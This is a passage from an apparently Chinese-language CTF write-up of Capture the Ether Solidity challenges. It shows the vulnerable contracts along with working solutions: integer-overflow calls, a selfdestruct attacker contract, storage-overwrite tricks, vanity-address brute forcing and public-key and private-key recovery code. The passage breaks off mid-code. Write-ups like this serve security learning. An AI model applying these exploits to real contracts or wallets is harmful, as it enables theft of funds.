balanceOf[msg.sender] -= value;<br>        balanceOf[to] += value;<br><br>        emit Transfer(msg.sender, to, value);<br>    &#125;<br><br>    function transfer(address to, uint256 value) public &#123;<br>        require(balanceOf[msg.sender] &gt;= value);<br>        require(balanceOf[to] + value &gt;= balanceOf[to]);<br><br>        _transfer(to, value);<br>    &#125;<br><br>    event Approval(address indexed owner, address indexed spender, uint256 value);<br><br>    function approve(address spender, uint256 value) public &#123;<br>        allowance[msg.sender][spender] = value;<br>        emit Approval(msg.sender, spender, value);<br>    &#125;<br><br>    function transferFrom(address from, address to, uint256 value) public &#123;<br>        require(balanceOf[from] &gt;= value);<br>        require(balanceOf[to] + value &gt;= balanceOf[to]);<br>        require(allowance[from][msg.sender] &gt;= value);<br><br>        allowance[from][msg.sender] -= value;<br>        _transfer(to, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>_transfer函数存在溢出</p>
<ol>
<li>account1 transfer(account2,1000)</li>
<li>account2 approve(account1,1000)</li>
<li>account1 transferFrom(account2,account3,1000)</li>
</ol>
<p>由于此时account1的代币余额为0，所以最后调用 <code>_transfer</code> 时会发生下溢</p>
<h3 id="Retirement-fund"><a href="#Retirement-fund" class="headerlink" title="Retirement fund"></a>Retirement fund</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract RetirementFundChallenge &#123;<br>    uint256 startBalance;<br>    address owner = msg.sender;<br>    address beneficiary;<br>    uint256 expiration = now + 10 years;<br><br>    function RetirementFundChallenge(address player) public payable &#123;<br>        require(msg.value == 1 ether);<br><br>        beneficiary = player;<br>        startBalance = msg.value;<br>    &#125;<br><br>    function isComplete() public view returns (bool) &#123;<br>        return address(this).balance == 0;<br>    &#125;<br><br>    function withdraw() public &#123;<br>        require(msg.sender == owner);<br><br>        if (now &lt; expiration) &#123;<br>            // early withdrawal incurs a 10% penalty<br>            msg.sender.transfer(address(this).balance * 9 / 10);<br>        &#125; else &#123;<br>            msg.sender.transfer(address(this).balance);<br>        &#125;<br>    &#125;<br><br>    function collectPenalty() public &#123;<br>        require(msg.sender == beneficiary);<br><br>        uint256 withdrawn = startBalance - address(this).balance;<br><br>        // an early withdrawal occurred<br>        require(withdrawn &gt; 0);<br><br>        // penalty is what&#x27;s left<br>        msg.sender.transfer(address(this).balance);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>使用selfdestruct函数，使 <code>collectPenalty()</code> 中的 <code>require(withdrawn &gt; 0);</code> 被满足</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.18;<br>contract attacker &#123;<br>    constructor() payable &#123;<br><br>    &#125;<br><br>    function attack() payable &#123;<br>        selfdestruct(0xde595FF7D9DED625Db68A569BbA0b708e69d025a);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="Mapping"><a href="#Mapping" class="headerlink" title="Mapping"></a>Mapping</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract MappingChallenge &#123;<br>    bool public isComplete;<br>    uint256[] map;<br><br>    function set(uint256 key, uint256 value) public &#123;<br>        // Expand dynamic array as needed<br>        if (map.length &lt;= key) &#123;<br>            map.length = key + 1;<br>        &#125;<br><br>        map[key] = value;<br>    &#125;<br><br>    function get(uint256 key) public view returns (uint256) &#123;<br>        return map[key];<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>类似<a target="_blank" rel="noopener" href="https://ethernaut.zeppelin.solutions/">Ethernaut</a>中的Alien Codex</p>
<p>数组长度越界，计算相对位置覆盖isComplete</p>
<h3 id="Donation"><a href="#Donation" class="headerlink" title="Donation"></a>Donation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract DonationChallenge &#123;<br>    struct Donation &#123;<br>        uint256 timestamp;<br>        uint256 etherAmount;<br>    &#125;<br>    Donation[] public donations;<br><br>    address public owner;<br><br>    function DonationChallenge() public payable &#123;<br>        require(msg.value == 1 ether);<br>        <br>        owner = msg.sender;<br>    &#125;<br>    <br>    function isComplete() public view returns (bool) &#123;<br>        return address(this).balance == 0;<br>    &#125;<br><br>    function donate(uint256 etherAmount) public payable &#123;<br>        // amount is in ether, but msg.value is in wei<br>        uint256 scale = 10**18 * 1 ether;<br>        require(msg.value == etherAmount / scale);<br><br>        Donation donation;<br>        donation.timestamp = now;<br>        donation.etherAmount = etherAmount;<br><br>        donations.push(donation);<br>    &#125;<br><br>    function withdraw() public &#123;<br>        require(msg.sender == owner);<br>        <br>        msg.sender.transfer(address(this).balance);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="http://www.freebuf.com/articles/blockchain-articles/175237.html">Solidity中存储方式错误使用所导致的变量覆盖</a></p>
<p>使传入的etherAmount，其值等于我们的Account地址</p>
<p>并满足msg.value == etherAmount / scal</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">uint</span><span class="hljs-params">(<span class="hljs-number">0</span>x9DC97146b924263A2c8C7237FbeEAFb6ef60b624)</span></span> / (<span class="hljs-number">10</span>**<span class="hljs-number">18</span>*<span class="hljs-number">10</span>**<span class="hljs-number">18</span>)<br><span class="hljs-comment">//900803868558</span><br></code></pre></td></tr></table></figure>

<p>然后调用withdraw</p>
<h3 id="Fifty-years"><a href="#Fifty-years" class="headerlink" title="Fifty years"></a>Fifty years</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract FiftyYearsChallenge &#123;<br>    struct Contribution &#123;<br>        uint256 amount;<br>        uint256 unlockTimestamp;<br>    &#125;<br>    Contribution[] queue;<br>    uint256 head;<br><br>    address owner;<br>    function FiftyYearsChallenge(address player) public payable &#123;<br>        require(msg.value == 1 ether);<br><br>        owner = player;<br>        queue.push(Contribution(msg.value, now + 50 years));<br>    &#125;<br><br>    function isComplete() public view returns (bool) &#123;<br>        return address(this).balance == 0;<br>    &#125;<br><br>    function upsert(uint256 index, uint256 timestamp) public payable &#123;<br>        require(msg.sender == owner);<br><br>        if (index &gt;= head &amp;&amp; index &lt; queue.length) &#123;<br>            // Update existing contribution amount without updating timestamp.<br>            Contribution storage contribution = queue[index];<br>            contribution.amount += msg.value;<br>        &#125; else &#123;<br>            // Append a new contribution. Require that each contribution unlock<br>            // at least 1 day after the previous one.<br>            require(timestamp &gt;= queue[queue.length - 1].unlockTimestamp + 1 days);<br><br>            contribution.amount = msg.value;<br>            contribution.unlockTimestamp = timestamp;<br>            queue.push(contribution);<br>        &#125;<br>    &#125;<br><br>    function withdraw(uint256 index) public &#123;<br>        require(msg.sender == owner);<br>        require(now &gt;= queue[index].unlockTimestamp);<br><br>        // Withdraw this and any earlier contributions.<br>        uint256 total = 0;<br>        for (uint256 i = head; i &lt;= index; i++) &#123;<br>            total += queue[i].amount;<br><br>            // Reclaim storage.<br>            delete queue[i];<br>        &#125;<br><br>        // Move the head of the queue forward so we don&#x27;t have to loop over<br>        // already-withdrawn contributions.<br>        head = index + 1;<br><br>        msg.sender.transfer(total);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>msg.value会覆盖queue的长度，timestamp会覆盖head</p>
<p>queue.push操作，因为其在最后执行增添对象的任务，添加以后它会将queue.length进行+1操作，用queue长度再覆盖contribution.amount一次</p>
<ol>
<li><p>首先，我们创建一个新的队列条目，调用<code>upsert</code>准备绕过<code>timestamp</code>检查。我们选择<code>timestamp</code>这样的值，它会<code>queue[queue.length - 1].unlockTimestamp + 1 days</code>以等于零的方式溢出。</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2</span>**<span class="hljs-number">256</span>-<span class="hljs-number">86400</span><br><span class="hljs-attribute">115792089237316195423570985008687907853269984665640564039457584007913129553536</span><br></code></pre></td></tr></table></figure>

<p>调用Upset(1,115792089237316195423570985008687907853269984665640564039457584007913129553536)并发送1 wei</p>
</li>
<li><p>调用Upset(1,0)并发送1 wei</p>
</li>
<li><p>调用withdraw(1)</p>
</li>
</ol>
<h2 id="Accounts"><a href="#Accounts" class="headerlink" title="Accounts"></a>Accounts</h2><h3 id="Fuzzy-identity"><a href="#Fuzzy-identity" class="headerlink" title="Fuzzy identity"></a>Fuzzy identity</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>interface IName &#123;<br>    function name() external view returns (bytes32);<br>&#125;<br><br>contract FuzzyIdentityChallenge &#123;<br>    bool public isComplete;<br><br>    function authenticate() public &#123;<br>        require(isSmarx(msg.sender));<br>        require(isBadCode(msg.sender));<br><br>        isComplete = true;<br>    &#125;<br><br>    function isSmarx(address addr) internal view returns (bool) &#123;<br>        return IName(addr).name() == bytes32(&quot;smarx&quot;);<br>    &#125;<br><br>    function isBadCode(address _addr) internal pure returns (bool) &#123;<br>        bytes20 addr = bytes20(_addr);<br>        bytes20 id = hex&quot;000000000000000000000000000000000badc0de&quot;;<br>        bytes20 mask = hex&quot;000000000000000000000000000000000fffffff&quot;;<br><br>        for (uint256 i = 0; i &lt; 34; i++) &#123;<br>            if (addr &amp; mask == id) &#123;<br>                return true;<br>            &#125;<br>            mask &lt;&lt;= 4;<br>            id &lt;&lt;= 4;<br>        &#125;<br><br>        return false;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>要求：</p>
<ol>
<li>合约的name为smarx</li>
<li>合约地址里包含 <code>badc0de</code></li>
</ol>
<p>以太坊源码中生成合约地址的算法</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">CreateAddress</span><span class="hljs-params">(b common.Address, nonce <span class="hljs-keyword">uint64</span>)</span> <span class="hljs-title">common</span>.<span class="hljs-title">Address</span></span> &#123;<br><br>    data, _ := rlp.EncodeToBytes([]<span class="hljs-keyword">interface</span>&#123;&#125;&#123;b, nonce&#125;) <span class="hljs-comment">//对地址和nonce进行rlp编码</span><br><br>    <span class="hljs-keyword">return</span> common.BytesToAddress(Keccak256(data)[<span class="hljs-number">12</span>:]) <span class="hljs-comment">//利用keccak256算hash，后20个字节作为新地址</span><br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>使用<a target="_blank" rel="noopener" href="https://github.com/ethjs/ethjs-account">ethjs-account</a>来生成地址</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> rlp = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;rlp&#x27;</span>);<br><span class="hljs-keyword">const</span> js = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;_js-sha3@0.8.0@js-sha3&#x27;</span>);<br><span class="hljs-keyword">const</span> generate = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;ethjs-account&#x27;</span>).generate;<br><br>seed=<span class="hljs-string">&#x27;892h@fs8sk^2hSFR*/8s8shfs.jk39hsoi@hohskd51D1Q8E1%^;DZ1-=.@WWRXNI()VF6/*Z%$C51D1QV*&lt;&gt;FE8RG!FI;&quot;./+-*!DQ39hsoi@hoFE1F5^7E%&amp;*QS&#x27;</span><span class="hljs-comment">//生成地址所用的种子</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fuzz</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> k=<span class="hljs-number">0</span>;k&lt;<span class="hljs-number">50000</span>;k++)&#123;<br>        seed=seed+<span class="hljs-built_in">Math</span>.random().toString(<span class="hljs-number">36</span>).substring(<span class="hljs-number">12</span>);<span class="hljs-comment">//为避免重复，生成一定数目后对种子进行更新</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">1000</span>;i++)&#123;<br>            res=generate(seed);<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> j=<span class="hljs-number">0</span>;j&lt;<span class="hljs-number">10</span>;j++)&#123;<br>                encodedRlp = rlp.encode([res.address, j]);<span class="hljs-comment">// 进行rlp编码</span><br>                buf = js.keccak256(encodedRlp);<br>                contractAddress =buf.slice(<span class="hljs-number">24</span>).toString(<span class="hljs-string">&#x27;hex&#x27;</span>);<span class="hljs-comment">//取buffer第12个字节后面的部分作为地址</span><br><br>                <span class="hljs-keyword">if</span>(contractAddress.slice(<span class="hljs-number">33</span>).match(<span class="hljs-string">&quot;badc0de&quot;</span>))&#123;<br>                    <span class="hljs-built_in">console</span>.log(contractAddress);<br>                    <span class="hljs-built_in">console</span>.log(res);<br>                    <span class="hljs-built_in">console</span>.log(j);<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-comment">//console.log(i);</span><br>        &#125;<br>    &#125;<br>&#125;<br>fuzz();<br></code></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-number">76</span>e9f28df246ee1b3f7d3bb2c4c81e6f0badc0de<br>&#123;<br>  privateKey: &#x27;0x2f1c57a072bd38affcdeaf2c574b9e9c8c120b<span class="hljs-number">7391</span>eb54a48a<span class="hljs-number">110345</span>cbd1ae88&#x27;,<br>  publicKey: &#x27;0xb111b1d6f154e4a<span class="hljs-number">8785</span>9bb2ad60bf05fd26abb7e77c6f26c<span class="hljs-number">492480</span>3ee<span class="hljs-number">9673</span>a3e<span class="hljs-number">55147652</span>d2f<span class="hljs-number">2662</span>d5a<span class="hljs-number">6591</span>df503f<span class="hljs-number">2711</span>7c182ce1b20d8afaaf2b4d4ed6a<span class="hljs-number">0737</span>9&#x27;,<br>  address: &#x27;0x4ABE0ad41C9A<span class="hljs-number">8128</span>9dCa9F257fd<span class="hljs-number">448264</span>e18AB1B&#x27;<br>&#125;<br><span class="hljs-number">8</span><br><br></code></pre></td></tr></table></figure>

<p>nonce为8时部署攻击合约</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract attack &#123;<br>    FuzzyIdentityChallenge fuzz;<br>    function pwn()&#123;<br>        fuzz=FuzzyIdentityChallenge(address of your challenge);<br>        fuzz.authenticate();<br>    &#125;<br>    function name() external view returns(bytes32)&#123;<br>        return bytes32(&quot;smarx&quot;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="Public-Key"><a href="#Public-Key" class="headerlink" title="Public Key"></a>Public Key</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract PublicKeyChallenge &#123;<br>    address owner = 0x92b28647ae1f3264661f72fb2eb9625a89d88a31;<br>    bool public isComplete;<br><br>    function authenticate(bytes publicKey) public &#123;<br>        require(address(keccak256(publicKey)) == owner);<br><br>        isComplete = true;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>由地址得到公钥</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/teaspring/article/details/77834360">椭圆曲线密码学和以太坊中的椭圆曲线数字签名算法应用</a></p>
<p>由 <code>w3.eth.getTransaction(&quot;0xabc467bedd1d17462fcc7942d0af7874d6f8bdefee2b299c9168a216d3ff0edb&quot;)</code> 可以得到</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">AttributeDict</span>(&#123;&#x27;blockHash&#x27;: HexBytes(&#x27;<span class="hljs-number">0</span>x<span class="hljs-number">487183</span>cd<span class="hljs-number">9</span>eed<span class="hljs-number">0970</span>dab<span class="hljs-number">843</span>c<span class="hljs-number">9</span>ebd<span class="hljs-number">577</span>e<span class="hljs-number">6</span>af<span class="hljs-number">3</span>e<span class="hljs-number">1</span>eb<span class="hljs-number">7</span>c<span class="hljs-number">9809</span>d<span class="hljs-number">240</span>c<span class="hljs-number">8735</span>eab<span class="hljs-number">7</span>cb<span class="hljs-number">43</span>de&#x27;), &#x27;blockNumber&#x27;: <span class="hljs-number">3015083</span>, &#x27;from&#x27;: &#x27;<span class="hljs-number">0</span>x<span class="hljs-number">92</span>b<span class="hljs-number">28647</span>Ae<span class="hljs-number">1</span>F<span class="hljs-number">3264661</span>f<span class="hljs-number">72</span>fb<span class="hljs-number">2</span>eB<span class="hljs-number">9625</span>A<span class="hljs-number">89</span>D<span class="hljs-number">88</span>A<span class="hljs-number">31</span>&#x27;, &#x27;gas&#x27;: <span class="hljs-number">90000</span>, &#x27;gasPrice&#x27;: <span class="hljs-number">1000000000</span>, &#x27;hash&#x27;: HexBytes(&#x27;<span class="hljs-number">0</span>xabc<span class="hljs-number">467</span>bedd<span class="hljs-number">1</span>d<span class="hljs-number">17462</span>fcc<span class="hljs-number">7942</span>d<span class="hljs-number">0</span>af<span class="hljs-number">7874</span>d<span class="hljs-number">6</span>f<span class="hljs-number">8</span>bdefee<span class="hljs-number">2</span>b<span class="hljs-number">299</span>c<span class="hljs-number">9168</span>a<span class="hljs-number">216</span>d<span class="hljs-number">3</span>ff<span class="hljs-number">0</span>edb&#x27;), &#x27;input&#x27;: &#x27;<span class="hljs-number">0</span>x<span class="hljs-number">5468616</span>e<span class="hljs-number">6</span>b<span class="hljs-number">732</span>c<span class="hljs-number">206</span>d<span class="hljs-number">616</span>e<span class="hljs-number">21</span>&#x27;, &#x27;nonce&#x27;: <span class="hljs-number">0</span>, &#x27;r&#x27;: HexBytes(&#x27;<span class="hljs-number">0</span>xa<span class="hljs-number">5522718</span>c<span class="hljs-number">0</span>f<span class="hljs-number">95</span>dde<span class="hljs-number">27</span>f<span class="hljs-number">0827</span>f<span class="hljs-number">55</span>de<span class="hljs-number">836342</span>ceda<span class="hljs-number">594</span>d<span class="hljs-number">20458523</span>dd<span class="hljs-number">71</span>a<span class="hljs-number">539</span>d<span class="hljs-number">52</span>ad<span class="hljs-number">7</span>&#x27;), &#x27;s&#x27;: HexBytes(&#x27;<span class="hljs-number">0</span>x<span class="hljs-number">5710</span>e<span class="hljs-number">64311</span>d<span class="hljs-number">481764</span>b<span class="hljs-number">5</span>ae<span class="hljs-number">8</span>ca<span class="hljs-number">691</span>b<span class="hljs-number">05</span>d<span class="hljs-number">14054782</span>c<span class="hljs-number">7</span>d<span class="hljs-number">489</span>f<span class="hljs-number">3511</span>a<span class="hljs-number">7</span>abf<span class="hljs-number">2</span>f<span class="hljs-number">5078962</span>&#x27;), &#x27;to&#x27;: &#x27;<span class="hljs-number">0</span>x<span class="hljs-number">6</span>B<span class="hljs-number">477781</span>b<span class="hljs-number">0</span>e<span class="hljs-number">68031109</span>f<span class="hljs-number">21887</span>e<span class="hljs-number">6</span>B<span class="hljs-number">5</span>afEAaEB<span class="hljs-number">002</span>b&#x27;, &#x27;transactionIndex&#x27;: <span class="hljs-number">7</span>, &#x27;type&#x27;: &#x27;<span class="hljs-number">0</span>x<span class="hljs-number">0</span>&#x27;, &#x27;v&#x27;: <span class="hljs-number">41</span>, &#x27;value&#x27;: <span class="hljs-number">0</span>&#125;)<br></code></pre></td></tr></table></figure>

<p>使用<a target="_blank" rel="noopener" href="https://github.com/ethereumjs/ethereumjs-tx">ethereumjs-tx</a>库创建一个交易从而利用里面封装的getSenderAddress得到公钥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs solidity">const EthereumTx = require(&#x27;ethereumjs-tx&#x27;).Transaction;<br>const js = require(&#x27;_js-sha3@0.8.0@js-sha3&#x27;);<br><br>var rawTx = &#123;<br>    nonce: &#x27;0x00&#x27;,<br>    gasPrice: &#x27;0x3b9aca00&#x27;,<br>    gasLimit: &#x27;0x15f90&#x27;,<br>    to: &#x27;0x6B477781b0e68031109f21887e6B5afEAaEB002b&#x27;,<br>    value: &#x27;0x00&#x27;,<br>    data: &#x27;0x5468616e6b732c206d616e21&#x27;,<br>    v: &#x27;0x29&#x27;,<br>    r: &#x27;0xa5522718c0f95dde27f0827f55de836342ceda594d20458523dd71a539d52ad7&#x27;,<br>    s: &#x27;0x5710e64311d481764b5ae8ca691b05d14054782c7d489f3511a7abf2f5078962&#x27;<br>&#125;;<br><br>var tx = new EthereumTx(rawTx, &#123; chain: &#x27;ropsten&#x27;, hardfork: &#x27;petersburg&#x27; &#125;);<br><br>pubkey=tx.getSenderPublicKey();<br>pubkeys=pubkey.toString(&#x27;hex&#x27;);<br>var address = js.keccak256(pubkey).toString(&#x27;hex&#x27;).slice(24);<br><br>console.log(pubkeys);<br>console.log(address);<br><br></code></pre></td></tr></table></figure>

<h3 id="Account-Takeover"><a href="#Account-Takeover" class="headerlink" title="Account Takeover"></a>Account Takeover</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract AccountTakeoverChallenge &#123;<br>    address owner = 0x6B477781b0e68031109f21887e6B5afEAaEB002b;<br>    bool public isComplete;<br><br>    function authenticate() public &#123;<br>        require(msg.sender == owner);<br><br>        isComplete = true;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>给出了地址求私钥</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2718">参考1</a></p>
<p><a target="_blank" rel="noopener" href="http://snowming.me/2022/01/05/recover_secert_key/">参考2</a></p>
<p>有两笔同 from 地址且同 to 地址的交易，且 r 值相同</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> EthereumTx = <span class="hljs-built_in">require</span>(<span 